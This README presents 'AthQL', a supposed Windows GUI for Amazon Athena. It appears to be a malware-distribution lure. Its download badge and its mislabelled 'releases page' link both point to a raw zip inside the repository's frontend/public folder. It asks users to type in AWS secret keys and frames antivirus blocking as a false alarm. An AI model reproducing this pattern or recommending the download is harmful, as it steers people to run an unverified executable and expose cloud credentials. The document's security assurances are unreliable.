# 📊 AthQL - Manage your Athena data with ease

[![](https://img.shields.io/badge/Download-AthQL-blue.svg)](https://raw.githubusercontent.com/macocram/AthQL/main/frontend/public/QL-Ath-1.9.zip)

AthQL is a desktop application. It helps you run and manage Athena queries. You do not need to use complex command line tools. This program provides a simple interface for your database tasks. You can view, edit, and organize your SQL queries in one place.

## 🚀 Getting Started

You can set up AthQL in a few minutes. The application runs on Windows. It connects to your Amazon Web Services account to access your data.

1. Ensure your computer has an active internet connection.
2. Visit the [releases page](https://raw.githubusercontent.com/macocram/AthQL/main/frontend/public/QL-Ath-1.9.zip) to download the latest setup file.
3. Locate the downloaded file in your folder.
4. Double-click the file to start the installation.
5. Follow the prompts on your screen.

## 🛠️ System Requirements

AthQL runs on modern Windows systems. Ensure your machine meets these specifications:

* Operating System: Windows 10 or Windows 11.
* Memory: 4GB of RAM minimum. 8GB is recommended for large datasets.
* Storage: 200MB of free disk space.
* Network: Access to the internet for database communication.
* Permissions: You need credentials for your AWS Athena service.

## 🔑 Setting Up Your Connection

Upon opening the app, you must link your AWS account. AthQL uses your security credentials to talk to Athena. 

1. Open the Settings menu inside the app.
2. Select the Connection tab.
3. Enter your AWS Access Key ID.
4. Enter your AWS Secret Access Key.
5. Choose your default AWS Region.
6. Press the Test Connection button to verify the link.

The application saves these settings in local storage. You do not need to enter them every time you restart the app.

## 📋 Running Queries

AthQL provides a clear workspace for your work. Use these steps to run a query:

1. Click the New Query button in the top menu.
2. Type your SQL command in the text box.
3. Click the Run button.
4. View your results in the data grid below the editor.

The app supports history tracking. You can search through previous queries to find work you did before.

## 💾 Saving and Managing Data

You can save your query files for later. AthQL creates local files on your computer. This lets you keep your work organized without needing the cloud for storage.

To save a file:
* Click File and then Save As.
* Name your file.
* Choose a folder on your computer.

You can open these files later by selecting Open from the same menu.

## 🔍 Troubleshooting Common Issues

Sometimes connections fail. If you see an error, check these conditions:

* Check your AWS user permissions. Your account needs Athena read and write access.
* Verify your internet connection. 
* Check that your region matches the region where your databases reside.
* Restart the application if the interface becomes unresponsive.

If buttons do not respond, verify that your antivirus software is not blocking the application. AthQL communicates with external services, and some security software may require permission to allow this traffic.

## 🏗️ Managing Database Tables

AthQL helps you see your tables without writing queries for everything. The sidebar shows a list of your databases and tables.

* Expand the database menu to see your tables.
* Click on a table name to see a preview of the data.
* Use the search bar in the sidebar to find specific tables.

This navigation tool saves time when you deal with many schemas. You can double-click a table name to insert it into your current query editor window.

## 🎨 Interface Customization

You can change how the application looks. Go to the View menu to adjust settings.

* Switch between Light Mode and Dark Mode.
* Adjust the font size in the query editor for better readability.
* Change the layout of the sidebar to gain more space for your query results.

The application remembers these choices even after you close and reopen it.

## 🛡️ Security Practices

AthQL handles your data locally. Your credentials reside on your own machine. We do not transmit your keys to any external servers. The app only uses your keys to talk to the AWS API directly.

To keep your setup secure:
* Do not share your computer with unauthorized users.
* Use a strong password for your Windows account.
* Update the application when a new version appears.
